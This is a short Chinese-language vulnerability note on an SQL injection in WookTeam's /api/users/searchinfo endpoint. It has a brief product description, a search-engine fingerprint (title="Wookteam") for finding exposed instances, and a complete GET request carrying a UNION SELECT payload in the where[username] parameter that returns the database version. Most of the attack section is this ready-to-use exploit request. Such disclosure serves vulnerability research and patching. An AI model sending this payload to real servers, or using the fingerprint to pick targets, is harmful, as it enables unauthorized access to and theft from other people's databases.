# WookTeam searchinfo存在SQL注入漏洞

# 一、漏洞简介
WookTeam是一款轻量级的开源在线团队协作工具，提供各类文档协作工具、在线思维导图、在线流程图、项目管理、任务分发、即时IM，知识库管理等工具。WookTeam接口searchinfo存在SQL注入漏洞

# 二、影响版本
+ WookTeam 

# 三、资产测绘
```plain
title="Wookteam"
```

![1723565393982-8aeb7f0d-5fe1-4076-a035-5aed15fa18e4.png](./img/JZaYfNdClRdp56X9/1723565393982-8aeb7f0d-5fe1-4076-a035-5aed15fa18e4-952469.png)

# 四、漏洞复现
```plain
GET /api/users/searchinfo?where[username]=1%27%29+UNION+ALL+SELECT+NULL%2CCONCAT%280x7e%2Cversion%28%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%23 HTTP/1.1
Host: 
```

![1723565359190-f3c20851-b4e8-45d4-8716-b8b370ef4c3c.png](./img/JZaYfNdClRdp56X9/1723565359190-f3c20851-b4e8-45d4-8716-b8b370ef4c3c-341062.png)



> 更新: 2024-09-05 23:21:35  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ocbt8satalaaymlq>